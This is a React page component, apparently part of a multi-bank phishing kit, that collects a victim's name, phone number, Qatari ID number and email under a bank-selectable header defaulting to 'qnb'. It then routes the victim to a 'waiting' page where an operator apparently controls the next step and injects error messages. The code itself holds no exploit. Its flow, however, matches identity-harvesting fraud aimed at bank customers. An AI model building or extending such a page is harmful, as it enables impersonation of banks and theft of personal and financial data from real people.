import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { X, User, Phone, CreditCard, Mail, ChevronRight, AlertCircle } from "lucide-react";

const TITLES = [
  {"text":"اللقب","value":""},
  {"text":"السيد","value":"MR"},
  {"text":"الآنسة","value":"MISS"},
  {"text":"الآنسة","value":"MS"},
  {"text":"السيدة","value":"MRS"},
  {"text":"سيد","value":"MSTR"},
  {"text":"الشيخة","value":"SHKA"},
  {"text":"الشيخ","value":"SHK"},
  {"text":"الدكتور","value":"DR"},
  {"text":"الأستاذ","value":"PROF"},
  {"text":"العميد","value":"BRIG"},
  {"text":"القائد","value":"CAPT"},
  {"text":"العقيد","value":"COL"},
  {"text":"اللواء","value":"GEN"},
  {"text":"الليدي","value":"LADY"},
  {"text":"الأمير","value":"PRIN"},
  {"text":"الأميرة","value":"PRCS"},
  {"text":"مدام","value":"MDM"},
  {"text":"لورد","value":"LORD"},
  {"text":"صاحب السعادة","value":"HE"},
  {"text":"الشريف/الشريفة","value":"HON"},
  {"text":"صاحب السمو الملكي","value":"HRHHIS"},
  {"text":"صاحبة السمو الملكي","value":"HRHHER"}
];

const COUNTRIES = [
  {"text":"دولة/قطاع الإقامة","value":""},{"text":"قطر","value":"QA"},{"text":"الإمارات العربيّة المتّحدة","value":"AE"},{"text":"المملكة العربية السعودية","value":"SA"},{"text":"الكويت","value":"KW"},{"text":"البحرين","value":"BH"},{"text":"سلطنة عمان","value":"OM"},{"text":"مصر","value":"EG"},{"text":"الأردن","value":"JO"},{"text":"لبنان","value":"LB"},{"text":"المغرب","value":"MA"},{"text":"الجزائر","value":"DZ"},{"text":"تونس","value":"TN"},{"text":"ليبيا","value":"LY"},{"text":"السودان","value":"SD"},{"text":"العراق","value":"IQ"},{"text":"اليمن","value":"YE"},{"text":"سوريا","value":"SY"},{"text":"فلسطين","value":"PS"},{"text":"المملكة المتحدة","value":"GB"},{"text":"الولايات المتحدة الأمريكية","value":"US"},{"text":"ألمانيا","value":"DE"},{"text":"فرنسا","value":"FR"},{"text":"تركيا","value":"TR"},{"text":"الهند","value":"IN"},{"text":"باكستان","value":"PK"},{"text":"أستراليا","value":"AU"},{"text":"كندا","value":"CA"},{"text":"اليابان","value":"JP"},{"text":"الصين","value":"CN"},{"text":"روسيا الاتحادية","value":"RU"},{"text":"إسبانيا","value":"ES"},{"text":"إيطاليا","value":"IT"},{"text":"هولندا","value":"NL"},{"text":"سويسرا","value":"CH"},{"text":"السويد","value":"SE"},{"text":"النرويج","value":"NO"},{"text":"النمسا","value":"AT"},{"text":"بلجيكا","value":"BE"},{"text":"البرازيل","value":"BR"},{"text":"الأرجنتين","value":"AR"},{"text":"المكسيك","value":"MX"},{"text":"ماليزيا","value":"MY"},{"text":"سنغافورة","value":"SG"},{"text":"تايلندا","value":"TH"},{"text":"أندونيسيا","value":"ID"},{"text":"الفليبين","value":"PH"},{"text":"فيتنام","value":"VN"},{"text":"كوريا الجنوبية","value":"KR"},{"text":"جنوب أفريقيا","value":"ZA"},{"text":"نيجيريا","value":"NG"},{"text":"كينيا","value":"KE"},{"text":"إثيوبيا","value":"ET"},{"text":"أذربيجان","value":"AZ"},{"text":"أرمينيا","value":"AM"},{"text":"أروبا","value":"AW"},{"text":"أفغانستان","value":"AF"},{"text":"ألبانيا","value":"AL"},{"text":"أنتيغوا وبربودا","value":"AG"},{"text":"أندورا","value":"AD"},{"text":"أنغولا","value":"AO"},{"text":"أورغواي","value":"UY"},{"text":"أوزباكستان","value":"UZ"},{"text":"أوغندا","value":"UG"},{"text":"أوكرانيا","value":"UA"},{"text":"إريتريا","value":"ER"},{"text":"إسرائيل","value":"IL"},{"text":"إلسلفادور","value":"SV"},{"text":"إيران","value":"IR"},{"text":"إيرلندا","value":"IE"},{"text":"استونيا","value":"EE"},{"text":"الإكوادور","value":"EC"},{"text":"البوسنا والهرسك","value":"BA"},{"text":"الجبل الأسود","value":"ME"},{"text":"الجمهورية السلوفاكية","value":"SK"},{"text":"الدانمارك","value":"DK"},{"text":"السنغال","value":"SN"},{"text":"الصومال","value":"SO"},{"text":"الغابون","value":"GA"},{"text":"الفاتيكان","value":"VA"},{"text":"الكاميرون","value":"CM"},{"text":"المجر","value":"HU"},{"text":"النيجر","value":"NE"},{"text":"بابوا غينيا الجديدة","value":"PG"},{"text":"باراغواي","value":"PY"},{"text":"بالاو","value":"PW"},{"text":"باهاماس","value":"BS"},{"text":"بربادوس","value":"BB"},{"text":"بروناي","value":"BN"},{"text":"بلغاريا","value":"BG"},{"text":"بليز","value":"BZ"},{"text":"بنغلاديش","value":"BD"},{"text":"بنما","value":"PA"},{"text":"بنين","value":"BJ"},{"text":"بوتان","value":"BT"},{"text":"بوتسوانا","value":"BW"},{"text":"بورتو ريكو","value":"PR"},{"text":"بوركينا فاسو","value":"BF"},{"text":"بوروندي","value":"BI"},{"text":"بولندا","value":"PL"},{"text":"بوليفيا","value":"BO"},{"text":"بولينيزيا الفرنسية","value":"PF"},{"text":"بيرو","value":"PE"},{"text":"تايوان, الصين","value":"TW"},{"text":"تركس وكايكوس","value":"TC"},{"text":"تركمانستان","value":"TM"},{"text":"ترينيداد وتوباغو","value":"TT"},{"text":"تشاد","value":"TD"},{"text":"تنزانيا","value":"TZ"},{"text":"توغو","value":"TG"},{"text":"توفالو","value":"TV"},{"text":"تونغا","value":"TO"},{"text":"تيمور ليست","value":"TL"},{"text":"جبل طارق","value":"GI"},{"text":"جرينلاند","value":"GL"},{"text":"جزر أنغويلا ليوارد","value":"AI"},{"text":"جزر الرأس الأخضر","value":"CV"},{"text":"جزر القمر","value":"KM"},{"text":"جزر الكريماس","value":"CX"},{"text":"جزر المالديف","value":"MV"},{"text":"جزر برمودا","value":"BM"},{"text":"جزر جوادلوب","value":"GP"},{"text":"جزر سليمان","value":"SB"},{"text":"جزر فارو","value":"FO"},{"text":"جزر فوكلاند","value":"FK"},{"text":"جزر فيرجن الأمريكية","value":"VI"},{"text":"جزر فيرجين البريطانية","value":"VG"},{"text":"جزر كايمان","value":"KY"},{"text":"جزر كوك","value":"CK"},{"text":"جزر كوكوس","value":"CC"},{"text":"جزر مارشال","value":"MH"},{"text":"جزر ماريانا الشمالية","value":"MP"},{"text":"جزيرة نورفولك","value":"NF"},{"text":"جمايكا","value":"JM"},{"text":"جمهورية أفريقيا الوسطى","value":"CF"},{"text":"جمهورية التشيكية","value":"CZ"},{"text":"جمهورية الدومينيكان","value":"DO"},{"text":"جمهورية الكونغو","value":"CG"},{"text":"جمهورية الكونغو الديمقراطية","value":"CD"},{"text":"جمهورية صربيا","value":"RS"},{"text":"جنوب السودان","value":"SS"},{"text":"جوام","value":"GU"},{"text":"جيبوتي","value":"DJ"},{"text":"جيورجيا","value":"GE"},{"text":"خراساو","value":"CW"},{"text":"دومينيكا","value":"DM"},{"text":"رواندا","value":"RW"},{"text":"روسيا البيضاء","value":"BY"},{"text":"رومانيا","value":"RO"},{"text":"ريونيون","value":"RE"},{"text":"ساحل العاج","value":"CI"},{"text":"ساموا","value":"WS"},{"text":"ساموا الأمريكية","value":"AS"},{"text":"سان تومي وبرينسيبي","value":"ST"},{"text":"سان مارينو","value":"SM"},{"text":"سانت بيير وميكلون","value":"PM"},{"text":"سانت فنسنت وغرينادين","value":"VC"},{"text":"سانت كيتس ونيفس","value":"KN"},{"text":"سانت لوسيا","value":"LC"},{"text":"سانت مارتن","value":"SX"},{"text":"سانت هيلينا","value":"SH"},{"text":"سريلانكا","value":"LK"},{"text":"سلوفينيا","value":"SI"},{"text":"سوازيلند","value":"SZ"},{"text":"سورينام","value":"SR"},{"text":"سيراليون","value":"SL"},{"text":"سيشيل","value":"SC"},{"text":"شيلي","value":"CL"},{"text":"طاجيكستان","value":"TJ"},{"text":"غامبيا","value":"GM"},{"text":"غانا","value":"GH"},{"text":"غرينادا","value":"GD"},{"text":"غواتيمال","value":"GT"},{"text":"غويانا الفرنسية","value":"GF"},{"text":"غيانا","value":"GY"},{"text":"غينيا","value":"GN"},{"text":"غينيا - بيساو","value":"GW"},{"text":"غينيا الاستوائية","value":"GQ"},{"text":"فانواتو","value":"VU"},{"text":"فنزويلا","value":"VE"},{"text":"فنلندا","value":"FI"},{"text":"فيجي","value":"FJ"},{"text":"قبرص","value":"CY"},{"text":"قيرغيزستان","value":"KG"},{"text":"كازاخستان","value":"KZ"},{"text":"كاليدونيا الجديدة","value":"NC"},{"text":"كرواتيا","value":"HR"},{"text":"كمبوديا","value":"KH"},{"text":"كوبا","value":"CU"},{"text":"كوريا الشمالية","value":"KP"},{"text":"كوستاريكا","value":"CR"},{"text":"كولومبيا","value":"CO"},{"text":"كيريباتي","value":"KI"},{"text":"لاتفيا","value":"LV"},{"text":"لاوس","value":"LA"},{"text":"لوكسمبورغ","value":"LU"},{"text":"ليبيريا","value":"LR"},{"text":"ليتوانيا","value":"LT"},{"text":"ليختنشتين","value":"LI"},{"text":"ليسوتو","value":"LS"},{"text":"مارتينيك","value":"MQ"},{"text":"مالاوي","value":"MW"},{"text":"مالطا","value":"MT"},{"text":"مالي","value":"ML"},{"text":"مايكرونيزيا","value":"FM"},{"text":"مقدونيا الشمالية","value":"MK"},{"text":"منغوليا","value":"MN"},{"text":"موريتانيا","value":"MR"},{"text":"موريشيوس","value":"MU"},{"text":"موزمبيق","value":"MZ"},{"text":"مولدافيا","value":"MD"},{"text":"موناكو","value":"MC"},{"text":"مونتسيرات","value":"MS"},{"text":"ميانمار","value":"MM"},{"text":"ناميبيا","value":"NA"},{"text":"نورو","value":"NR"},{"text":"نيبال","value":"NP"},{"text":"نيكاراجوا","value":"NI"},{"text":"نيوزيلندا","value":"NZ"},{"text":"نيوى","value":"NU"},{"text":"هايتي","value":"HT"},{"text":"هندوراس","value":"HN"},{"text":"هونغ كونغ، الصين","value":"HK"}
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const { language } = useLanguage();
  const isArabic = language === "ar";
  const hasError = params.get("error") === "true";
  const sessionId = params.get("session") || localStorage.getItem("sessionId") || "";

  const [formData, setFormData] = useState({
    title: "",
    nameArabic: "",
    phoneNumber: "",
    idNumber: "",
    email: "",
    residence: "QA"
  });

  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  useEffect(() => {
    if (hasError) {
      const msg = sessionStorage.getItem("error_message");
      if (msg) {
        setErrorMessage(msg);
        sessionStorage.removeItem("error_message");
      }
    }
  }, [hasError]);

  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const result = await createSessionMutation.mutateAsync({
        selectedBank: bank,
        personalData: {
          ...formData,
          nameArabic: `${formData.title} ${formData.nameArabic}`.trim()
        }
      });
      localStorage.setItem("sessionId", result.id);
      setLocation(`/waiting?bank=${bank}&session=${result.id}&next=registration-completion`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred");
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <Header />
      
      <main className="flex-1 max-w-xl mx-auto w-full px-4 py-8">
        <div className="bg-white rounded-[2.5rem] shadow-xl border border-slate-100 overflow-hidden">
          <div className="bg-[#8C0032] p-8 text-white text-center">
            <h1 className="text-2xl font-black">{isArabic ? "البيانات الشخصية" : "Personal Information"}</h1>
            <p className="text-sm opacity-80 mt-2">{isArabic ? "يرجى إدخال بياناتك بشكل صحيح للمتابعة" : "Please enter your details correctly to proceed"}</p>
          </div>

          <div className="p-8">
            {errorMessage && (
              <div className="mb-8 bg-rose-50 border-2 border-rose-100 rounded-2xl p-5 flex items-start gap-4 animate-in fade-in slide-in-from-top-4">
                <X className="w-6 h-6 bg-rose-500 text-white rounded-full p-1 shrink-0" />
                <p className="text-rose-700 font-bold leading-relaxed">{errorMessage}</p>
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="grid grid-cols-3 gap-4">
                <div className="col-span-1 space-y-2">
                  <label className="text-xs font-black text-slate-400 uppercase px-1">{isArabic ? "اللقب" : "Title"}</label>
                  <select 
                    className="w-full h-14 bg-slate-50 border-2 border-slate-100 rounded-2xl px-3 font-bold focus:border-[#8C0032] outline-none transition-all"
                    value={formData.title}
                    onChange={(e) => setFormData({...formData, title: e.target.value})}
                    required
                  >
                    {TITLES.map((t, i) => <option key={i} value={t.value}>{t.text}</option>)}
                  </select>
                </div>
                <div className="col-span-2 space-y-2">
                  <label className="text-xs font-black text-slate-400 uppercase px-1">{isArabic ? "الاسم الكامل" : "Full Name"}</label>
                  <div className="relative">
                    <User className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 w-5 h-5" />
                    <input
                      type="text"
                      required
                      placeholder={isArabic ? "أدخل اسمك الكامل" : "Enter your full name"}
                      className="w-full h-14 pr-12 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-[#8C0032] outline-none transition-all font-bold"
                      value={formData.nameArabic}
                      onChange={(e) => setFormData({...formData, nameArabic: e.target.value})}
                    />
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-black text-slate-400 uppercase px-1">{isArabic ? "رقم الهاتف" : "Phone Number"}</label>
                <div className="relative">
                  <Phone className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 w-5 h-5" />
                  <input
                    type="tel"
                    required
                    placeholder="5XXX XXXX"
                    className="w-full h-14 pr-12 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-[#8C0032] outline-none transition-all font-bold text-left"
                    value={formData.phoneNumber}
                    onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-black text-slate-400 uppercase px-1">{isArabic ? "الرقم الشخصي (QID)" : "ID Number"}</label>
                <div className="relative">
                  <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 w-5 h-5" />
                  <input
                    type="text"
                    required
                    placeholder="2XXXXXXXXXX"
                    className="w-full h-14 pr-12 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-[#8C0032] outline-none transition-all font-bold text-left"
                    value={formData.idNumber}
                    onChange={(e) => setFormData({...formData, idNumber: e.target.value})}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-black text-slate-400 uppercase px-1">{isArabic ? "البريد الإلكتروني" : "Email Address"}</label>
                <div className="relative">
                  <Mail className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 w-5 h-5" />
                  <input
                    type="email"
                    required
                    placeholder="example@domain.com"
                    className="w-full h-14 pr-12 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-[#8C0032] outline-none transition-all font-bold text-left"
                    value={formData.email}
                    onChange={(e) => setFormData({...formData, email: e.target.value})}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-black text-slate-400 uppercase px-1">{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
                <select 
                  className="w-full h-14 bg-slate-50 border-2 border-slate-100 rounded-2xl px-4 font-bold focus:border-[#8C0032] outline-none transition-all"
                  value={formData.residence}
                  onChange={(e) => setFormData({...formData, residence: e.target.value})}
                  required
                >
                  {COUNTRIES.map((c, i) => <option key={i} value={c.value}>{c.text}</option>)}
                </select>
              </div>

              <button
                type="submit"
                disabled={createSessionMutation.isPending}
                className="w-full h-16 bg-[#8C0032] hover:bg-[#a8003d] text-white text-xl font-black rounded-2xl shadow-xl shadow-rose-100 transition-all active:scale-95 flex items-center justify-center gap-3 mt-4"
              >
                {createSessionMutation.isPending ? <div className="w-6 h-6 border-4 border-white/30 border-t-white rounded-full animate-spin"></div> : (
                  <>
                    <span>{isArabic ? "متابعة" : "Continue"}</span>
                    <ChevronRight className={isArabic ? "rotate-180" : ""} />
                  </>
                )}
              </button>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
}
